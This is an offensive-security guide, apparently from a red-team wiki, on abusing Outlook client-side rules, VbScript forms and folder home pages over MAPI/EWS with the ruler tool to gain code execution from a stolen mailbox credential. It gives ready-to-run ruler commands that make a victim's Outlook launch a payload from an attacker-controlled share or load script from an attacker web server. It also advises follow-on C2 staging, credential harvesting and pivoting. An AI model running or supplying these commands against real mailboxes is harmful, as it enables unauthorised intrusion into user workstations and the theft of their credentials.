---
title: "Outlook client abuse: rules, forms, and home pages over MAPI"
description: "Turning a valid mailbox credential into code execution on the victim workstation with no server RCE: weaponizing client-side Outlook rules that launch a payload on message receipt, custom VbScript forms triggered by a crafted message, and the folder home page WebView that loads attacker HTML when the folder is opened, all pushed over MAPI/EWS with ruler."
keywords:
  - Outlook rules
  - custom forms
  - folder home page
  - ruler
  - MAPI
---

# Outlook client abuse

When you hold a valid mailbox credential but have no server code execution, the Outlook **client** is the payload delivery mechanism. Three legacy Outlook features run attacker-controlled code on whatever workstation syncs the mailbox: client-side **rules** that start an application on message receipt, custom **forms** that carry VbScript executed when a crafted message is read, and the folder **home page** WebView that loads an attacker URL when the folder is opened. All three are stored in the mailbox and pushed remotely over MAPI/EWS, so you weaponize them from Linux with `ruler` using only the credential. The code runs in the user's context the next time Outlook synchronizes.

## Preconditions

- A valid mailbox credential (from [spraying](password-spraying.md)) and MAPI/HTTP or EWS reachable (`ruler` autodiscovers the endpoint).
- The victim runs the desktop **Outlook** client (these are client features; OWA-only users are not affected).
- A reachable payload location for the rule path (a UNC/WebDAV path or a local path you can stage), or an attacker web server for the home-page variant.

## Rules: launch a payload on receipt

A client-side rule with a "start application" action runs the referenced executable when a message matching the trigger arrives. `ruler` creates the rule remotely and sends the trigger message:

```bash
# Create a rule that runs a payload when a message with the trigger subject arrives, then send it
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  rule add --name updater --trigger "pwned" --location "\\10.10.14.7\share\payload.exe" --send
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  rule display   # confirm the rule is present in the mailbox
```

Interpret it: `rule add ... --send` reports the rule was written and the trigger mail dispatched. When the victim's Outlook syncs and the rule fires, it executes `payload.exe` from the UNC path in the user's session. Host the payload on a WebDAV or SMB share the workstation can reach; `rule display` listing your rule confirms the write even before the trigger lands.

## Forms: VbScript behind a crafted message

A custom message form can carry a VbScript handler that runs when a message of that form's class is opened or auto-previewed. `ruler` uploads the form to the mailbox and sends a message that instantiates it:

```bash
# Upload a malicious form and trigger it with a matching message
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  form add --suffix pwn --input command.txt --send
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  form display
```

`command.txt` holds the command the form's VbScript runs. The `--send` triggers it immediately; `form display` confirms the form is stored. Forms execute without the user clicking an attachment, which is why they are stealthier than the rule's visible UNC launch.

## Home page: WebView HTML on folder open

A folder's **home page** is a URL Outlook renders in a WebView when the folder is selected. Point it at attacker HTML that runs script (a classic ActiveX/script payload) and it executes when the victim opens the folder:

```bash
# Set the Inbox home page to an attacker URL serving the payload HTML
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  homepage add --url "http://10.10.14.7/p.html"
```

A success message means the `homepage` property was written to the folder. When the victim next browses that folder, Outlook fetches and renders `p.html`, running its script in the user's context.

## Follow-on

Any of the three yields code execution in the **victim user's session** on their workstation the next time Outlook syncs or the trigger fires. That is a foothold on a user endpoint reached purely from a mailbox credential, no server compromise. From there, run a C2 stager, harvest local credentials and tokens, and pivot into the internal network. Pair it with the [GAL harvest](enumeration.md) to pick high-value recipients.

## Exploitation notes

- Pick the technique by what the target allows: rules need a reachable UNC/WebDAV payload path and are the most visible; forms run without user interaction and are quieter; the home page needs an attacker web server and the folder to be opened.
- These are client features stored server-side, so the victim does not need to accept anything; the next Outlook sync delivers the rule, form, or home-page change.
- Newer Outlook builds disable or warn on some of these (external home pages, start-application rules), so test which the target's build still honors; legacy or unmanaged clients are the reliable ones.
- `ruler brute` also sprays and `ruler` autodiscovers the endpoint, so a single tool covers credential validation and abuse.

## Tools

- **ruler** (SensePost): rule, form, and home-page abuse over MAPI/EWS from Linux.
- **Outlook desktop client**: manual rule/form creation when you already have an interactive session.
- **Responder / impacket smbserver / WebDAV**: host the payload for the rule's launch path.

## References

- [SensePost: ruler and the Outlook rules attack](https://sensepost.com/blog/2017/outlook-forms-and-shells/)
- [ruler (SensePost)](https://github.com/sensepost/ruler)
- [SpecterOps: Outlook home page persistence and abuse](https://posts.specterops.io/outlook-today-homepage-persistence-33ea9b505943)
